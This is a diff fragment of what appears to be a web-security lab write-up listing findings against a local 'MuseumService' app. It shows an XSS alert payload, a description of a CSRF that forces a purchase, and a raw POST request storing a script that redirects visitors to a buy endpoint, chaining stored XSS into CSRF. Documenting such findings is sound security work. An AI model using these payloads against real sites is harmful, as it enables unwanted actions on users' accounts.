@@ -34,8 +34,19 @@ N04:
     "<script>alert(\"evil\")</script>"
 
 N05: 
+    A CRSF that forces the user to buy an item could be launched by getting the user to click on a well formatted URL, 
+    as the only required query parameter is the item id 
+    (though if the user hasn't authenticated themselves on the current session, it will still ask for authentication.)
 
 N06: 
+    POST http://localhost:8188/MuseumService.svc/comment?name=XSS HTTP/1.1
+    Host: localhost:8188
+    Content-Type: application/json; charset=utf-8
+    Origin: http://localhost:8188
+    Content-Length: 91
+
+
+    "<script>window.location = \"http://localhost:8189/Service.svc/buy?item=cap-beige\"</script>"
 
 -- CO-LOCATED USER --
 
